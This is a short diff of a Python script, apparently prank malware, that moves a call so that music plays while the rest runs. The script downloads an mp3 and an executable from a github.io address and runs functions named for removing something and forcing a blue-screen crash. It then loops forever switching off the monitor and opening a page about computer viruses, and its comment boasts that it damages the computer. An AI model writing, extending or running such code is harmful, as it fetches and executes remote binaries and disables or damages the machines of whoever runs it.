@@ -38,7 +38,6 @@ def REMPROM():
 
 
 path = DownloadFile('https://psvks.github.io/psvks/uploads/FullVersion.mp3')
-StartProcess(path)
 path2 = DownloadFile('https://psvks.github.io/psvks/uploads/otherfile.exe')
 def addBSOD():
     global path2
@@ -49,6 +48,7 @@ def addBSOD():
 REMPROM()
 addBSOD()
 
+StartProcess(path) # This will make the music start while the program is fucking the computer
 while True:
     StopMonitor()
     os.system("start https://en.wikipedia.org/wiki/Computer_virus")
